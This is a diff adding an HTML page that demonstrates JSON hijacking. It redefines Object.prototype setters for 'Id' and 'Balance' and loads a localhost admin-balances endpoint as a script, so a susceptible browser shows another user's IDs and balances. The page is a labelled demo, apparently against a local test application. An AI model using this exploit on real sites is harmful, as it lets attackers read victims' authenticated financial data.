@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+    <title>Json Hijack Demo</title>
+</head>
+
+    <body style="float: left">
+        <h1 id="message">Your browser appears to be immune to this specific attack.</h1>
+        <h1 id="hackmessage" style="display: none;">Your browser is succeptible to this attack and gave away some sensitive information. Doh!</h1>
+        <div id="ids" style="width: 100px; float: left;"><b>IDs</b></div>
+        <div id="balances" style="width: 100px; float: left;"><b>Balances</b></div>
+    
+        <script type="text/javascript">
+            var balances = document.getElementById("balances");
+            var ids = document.getElementById("ids");
+            var message = document.getElementById('message');
+            var hackmessage = document.getElementById('hackmessage');
+            Object.prototype.__defineSetter__('Id', function (obj) {
+                message.style.display = 'none';
+                hackmessage.style.display = 'block';
+                ids.innerHTML += '<br />' + obj;
+            });
+            Object.prototype.__defineSetter__('Balance', function (obj) {
+                    balances.innerHTML += '<br />' + obj;
+            });        
+        </script>
+        <script type="text/javascript" src="http://localhost:54607/Home/AdminBalances"></script>
+    </body>
+</html>
